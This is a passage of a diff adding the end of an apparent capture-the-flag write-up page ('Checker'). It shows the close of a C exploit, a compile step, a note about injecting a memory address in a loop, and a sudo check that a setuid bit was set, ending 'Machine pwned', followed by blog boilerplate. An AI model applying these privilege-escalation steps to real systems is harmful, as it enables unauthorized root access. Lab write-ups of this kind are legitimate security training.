+	<span class="p">}</span>
+	
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+
+<p>Compile the script and create a loop to be injecting the generated memory address</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gcc</span> <span class="o">-</span><span class="n">o</span> <span class="n">output</span> <span class="n">script</span><span class="p">.</span><span class="n">c</span>
+
+</code></pre></div></div>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_46.png" alt="image.png" /></p>
+
+<p>Run the sudo command and verify that the setuid was applied correctly</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_47.png" alt="image.png" /></p>
+
+<p>Machine pwned!!!!</p>
+
+</div>
+
+
+<div class="comments">
+<div id="disqus_thread"></div>
+<script>
+ var disqus_config = function () {
+     this.page.url = 'https://your-site-url/writeups/2025/07/17/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e.html';
+     this.page.identifier = '/writeups/2025/07/17/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e';
+     this.page.title = 'Checker 1eab952552918014a431c736eae89e54';
+ };
+
+ (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
+     var d = document, s = d.createElement('script');
+
+     s.src = '//<your-disqus-shortname>.disqus.com/embed.js';
+
+     s.setAttribute('data-timestamp', +new Date());
+     (d.head || d.body).appendChild(s);
+ })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+</div>
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/writeups/2025/07/17/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e.html">
+            Dog 207b952552918059ae99cbb25a8392ef
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/writeups/2025/07/17/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9.html">
+            Titanic 1eab9525529180a9b52fc9a7eb126a50
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/writeups/2025/07/17/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb.html">
+            Cat 1abb9525529180ae82d4f25f2121346a
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+
+
+<script>
+  let i = 0;
+  const text = '';
+  const speed = parseInt('50');
+  
+  function typeWriter() {
+    if (i < text.length) {
+      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
+      i++;
+      setTimeout(typeWriter, speed);
+    }
+  }
+
+  document.getElementById('animated-post-description').style.display = 'initial';
+  typeWriter();
+
+  // Image modal
+  var $imgs = [];
+  $('img').each(function(idx) {
+    var obj = {
+      src: $(this).attr('src')
+    }
+    $imgs.push(obj);
+    var elem = $(this);
+    $(this).click(function() {
+      $('.modal').magnificPopup('open', idx);
+    });
+  });
+
+  $('.modal').magnificPopup({
+    items: $imgs,
+    type: 'image',
+    closeOnContentClick: true,
+    mainClass: 'mfp-img-mobile',
+    image: {
+      verticalFit: true
+    }
+    
+  });
+</script>
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
